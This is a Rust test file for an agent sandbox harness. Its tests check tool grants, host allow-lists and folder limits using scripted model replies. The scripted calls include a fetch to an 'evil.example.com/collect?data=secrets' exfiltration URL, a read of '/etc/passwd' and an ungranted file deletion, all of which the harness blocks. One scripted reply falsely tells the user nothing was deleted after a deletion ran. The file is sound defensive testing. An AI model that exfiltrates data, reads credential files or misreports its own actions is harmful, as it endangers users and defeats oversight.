use std::path::{Path, PathBuf};

use agent_test::record::{Dispatched, Refusal, Response};
use agent_test::run_types::{Finish, ReplyPart, RunError, RunOutcome};
use agent_test::spec::{Call, Folder, HttpStub, Reply, Scenario, Tool};
use agent_test::tool_types::{CallError, OutcomeError, ToolAnnotations, ToolDef, ToolResponse};
use agent_test::types::{ToolInput, ToolOutput};
use agent_test::{Finished, Ran, run};
use anyhow::{Result, bail};
use serde_json::json;

fn component(file: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("target/wasm32-wasip2/release")
        .join(file)
}

fn scenario(message: &str, replies: Vec<Reply>) -> Scenario {
    Scenario::new(component("minimal_agent.wasm"), message, replies)
}

fn stub(
    name: &str,
    read_only: bool,
    input: ToolInput,
    result: Result<ToolResponse, CallError>,
) -> Tool {
    Tool::Stub {
        def: ToolDef {
            name: name.into(),
            title: None,
            description: name.into(),
            input,
            output_schema: None,
            annotations: ToolAnnotations {
                read_only: Some(read_only),
                destructive: None,
                idempotent: None,
                open_world: None,
            },
            version: None,
        },
        results: vec![result],
    }
}

fn text_tool(name: &str, field: &str, read_only: bool, result: &str) -> Tool {
    stub(
        name,
        read_only,
        ToolInput::JsonSchema(
            json!({
                "type": "object", "properties": {(field): {"type": "string"}}, "required": [field]
            })
            .to_string(),
        ),
        Ok(ToolResponse {
            output: vec![ToolOutput::Text(result.into())],
            structured: None,
            is_error: false,
        }),
    )
}

fn fetch_tool(hosts: Vec<String>, folders: Vec<Folder>) -> Tool {
    Tool::Component {
        path: component("fetch_tool.wasm"),
        hosts,
        folders,
    }
}

fn done(finished: &Finished) -> &RunOutcome {
    match &finished.ran {
        Ran::Started {
            outcome: Ok(outcome),
        } => {
            assert!(
                matches!(outcome.finish, Finish::Done),
                "{:?}",
                outcome.finish
            );
            outcome
        }
        Ran::Started {
            outcome: Err(error),
        } => panic!("agent run failed: {error:?}"),
        Ran::Refused(error) => panic!("agent refused to start: {error:?}"),
    }
}

fn dispatched<const N: usize>(result: &Finished) -> &[Dispatched; N] {
    result
        .record
        .dispatched
        .as_slice()
        .try_into()
        .unwrap_or_else(|_| {
            panic!(
                "expected {N} dispatched calls, got {:?}",
                result.record.dispatched
            )
        })
}

fn returned(call: &Dispatched, is_error: bool) -> &str {
    let Response::Returned {
        text,
        is_error: actual,
    } = &call.response
    else {
        panic!("expected a tool response, got {:?}", call.response);
    };
    assert_eq!(*actual, is_error, "{text}");
    text
}

#[tokio::test]
async fn granted_tool_receives_the_models_arguments() -> Result<()> {
    let args = json!({"text": "hello"});
    let mut test = scenario(
        "echo hello",
        vec![
            Reply {
                reasoning: Some("Planning the call.".into()),
                text: Some("Using the tool.".into()),
                ..Reply::calls(vec![Call::json("echo", args.clone())])
            },
            Reply::text("The tool said: hello"),
        ],
    );
    test.tools.push(text_tool("echo", "text", true, "hello"));
    test.grants.tools = Some(vec!["echo".into()]);

    let result = run(&test).await?;
    assert!(
        matches!(done(&result).reply.as_slice(), [ReplyPart::Text(text)] if text == "The tool said: hello")
    );
    let [call] = dispatched(&result);
    assert_eq!(call.name, "echo");
    assert_eq!(call.arguments.as_ref(), Some(&args));
    assert_eq!(returned(call, false), "hello");
    assert!(result.record.refused.is_empty());
    assert_eq!(result.record.model_calls.len(), 2);
    assert_eq!(
        result.journal,
        [
            "agent.step.v1",
            "agent.run.v1",
            "agent.op.v1",
            "agent.op-result.v1",
            "agent.step.v1",
            "agent.op.v1",
            "agent.op-result.v1",
            "agent.step.v1",
            "agent.op.v1",
            "agent.op-result.v1",
            "agent.step.v1",
            "agent.run-result.v1",
        ]
    );
    Ok(())
}

#[tokio::test]
async fn ungranted_tool_is_refused_before_dispatch() -> Result<()> {
    let mut test = scenario(
        "tidy up my notes",
        vec![
            Reply::calls(vec![Call::json(
                "delete_file",
                json!({"path": "/home/me/notes.txt"}),
            )]),
            Reply::text("I could not delete it."),
        ],
    );
    test.tools = vec![
        text_tool("echo", "text", true, "hello"),
        text_tool("delete_file", "path", false, "deleted"),
    ];
    test.grants.tools = Some(vec!["echo".into()]);

    let result = run(&test).await?;
    done(&result);
    assert!(
        result.record.dispatched.is_empty(),
        "{:?}",
        result.record.dispatched
    );
    let [refusal] = result.record.refused.as_slice() else {
        bail!("unexpected refusals: {:?}", result.record.refused)
    };
    assert_eq!(refusal.by, "agent");
    assert!(
        matches!(&refusal.what, Refusal::Tool { name, why } if name == "delete_file" && why == "not granted")
    );
    assert_eq!(result.record.model_calls, [vec!["echo"], vec!["echo"]]);
    Ok(())
}

#[tokio::test]
async fn tool_component_can_reach_only_its_granted_hosts() -> Result<()> {
    let allowed = "https://api.example.com/status";
    let denied = "https://evil.example.com/collect?data=secrets";
    let mut test = scenario(
        "check the status",
        vec![
            Reply::calls(vec![
                Call::json("fetch", json!({"url": allowed})),
                Call::json("fetch", json!({"url": denied})),
            ]),
            Reply::text("The status is ok."),
        ],
    );
    test.tools
        .push(fetch_tool(vec!["api.example.com".into()], vec![]));
    test.http.push(HttpStub {
        method: "GET".into(),
        url: allowed.into(),
        status: 200,
        body: r#"{"ok": true}"#.into(),
    });

    let result = run(&test).await?;
    done(&result);
    let [first, second] = dispatched(&result);
    assert_eq!(
        (first.name.as_str(), second.name.as_str()),
        ("fetch", "fetch")
    );
    assert_eq!(first.arguments, Some(json!({"url": allowed})));
    assert_eq!(second.arguments, Some(json!({"url": denied})));
    assert_eq!(returned(first, false), r#"200 {"ok": true}"#);
    returned(second, true);
    let requests: Vec<_> = result
        .record
        .egress
        .iter()
        .map(|e| (e.url.as_str(), e.allowed))
        .collect();
    assert_eq!(requests, [(allowed, true), (denied, false)]);
    let [refusal] = result.record.refused.as_slice() else {
        bail!("unexpected refusals: {:?}", result.record.refused)
    };
    assert_eq!(refusal.by, "fetch_tool");
    assert!(matches!(&refusal.what, Refusal::Host { host, .. } if host == "evil.example.com"));
    Ok(())
}

#[tokio::test]
async fn tool_component_can_read_only_its_granted_folders() -> Result<()> {
    let paths = ["/data/notes.txt", "/etc/passwd"];
    let calls = paths
        .iter()
        .map(|p| Call::json("read_file", json!({"path": p})))
        .collect();
    let mut test = scenario(
        "what do my notes say?",
        vec![
            Reply::calls(calls),
            Reply::text("Your notes say to ship on Friday."),
        ],
    );
    test.tools.push(fetch_tool(
        vec![],
        vec![Folder {
            path: Path::new(env!("CARGO_MANIFEST_DIR")).join("../fixtures/files"),
            guest: "/data".into(),
            writable: false,
        }],
    ));
    test.grants.tools = Some(vec!["read_file".into()]);

    let result = run(&test).await?;
    done(&result);
    let [first, second] = dispatched(&result);
    for (call, path) in [first, second].into_iter().zip(paths) {
        assert_eq!(call.name, "read_file");
        assert_eq!(call.arguments, Some(json!({"path": path})));
    }
    assert!(returned(first, false).contains("Ship on Friday"));
    returned(second, true);
    Ok(())
}

#[tokio::test]
async fn unknown_tool_outcome_stops_the_run() -> Result<()> {
    let mut test = scenario(
        "deploy to staging",
        vec![Reply::calls(vec![Call::json(
            "deploy",
            json!({"env": "staging"}),
        )])],
    );
    test.tools.push(stub(
        "deploy",
        false,
        ToolInput::JsonSchema(r#"{"type":"object"}"#.into()),
        Err(CallError::OutcomeUnknown(OutcomeError::TimedOut)),
    ));

    let result = run(&test).await?;
    assert!(matches!(
        result.ran,
        Ran::Started {
            outcome: Err(RunError::Failed(_))
        }
    ));
    let [call] = dispatched(&result);
    assert_eq!(call.name, "deploy");
    assert_eq!(result.record.model_calls.len(), 1);
    Ok(())
}

#[tokio::test]
async fn model_denial_does_not_hide_a_dispatched_call() -> Result<()> {
    let mut test = scenario(
        "tidy up",
        vec![
            Reply::calls(vec![Call::json(
                "delete_file",
                json!({"path": "notes.txt"}),
            )]),
            Reply::text("I did not delete anything."),
        ],
    );
    test.tools
        .push(text_tool("delete_file", "path", false, "deleted"));

    let result = run(&test).await?;
    assert!(
        matches!(done(&result).reply.as_slice(), [ReplyPart::Text(text)] if text.contains("did not delete"))
    );
    let [call] = dispatched(&result);
    assert_eq!(call.name, "delete_file");
    Ok(())
}

#[tokio::test]
async fn exhausted_model_script_fails_the_test() {
    let mut test = scenario(
        "echo hi",
        vec![Reply::calls(vec![Call::json(
            "echo",
            json!({"text": "hi"}),
        )])],
    );
    test.tools.push(text_tool("echo", "text", true, "hi"));

    let Err(error) = run(&test).await else {
        panic!("an exhausted script should fail the test")
    };
    assert_eq!(
        error.to_string(),
        "the agent called the model 2 times; the script has 1 replies"
    );
}
